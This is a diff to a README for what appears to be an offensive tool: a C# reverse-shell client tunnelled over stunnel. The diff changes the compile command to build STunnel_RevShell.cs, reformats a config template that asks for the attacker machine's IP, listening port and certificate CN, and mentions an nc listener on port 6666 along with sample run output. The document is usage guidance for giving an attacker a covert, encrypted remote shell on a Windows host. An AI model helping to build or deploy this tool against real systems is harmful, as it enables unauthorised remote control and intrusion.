@@ -49,17 +49,18 @@ Then we can lunch nc to listen on port 6666 as configurated on stunnel
 ## Compile the client:
 Youn can compile the client as follows:
 
-	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe Program.cs
+	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe STunnel_RevShell.cs
 	
 The configuration file (config) must be present in the same directory of the executable file and must contain the following information:
 
-		ip:<attacker machine IP>
-		port:<listen stunnel port on the attacker machine>
-		CN:<CN name as set on the stunnel certificate> 
+	ip:<attacker machine IP>
+	port:<listen stunnel port on the attacker machine>
+	CN:<CN name as set on the stunnel certificate> 
 
 	
 Executing Program.exe we should read the following on the shell
-	
+
+	STunnel_RevShell.exe 	
 		Starting decoding, please wait...
 		Certificate revocation list checked: False
 		...
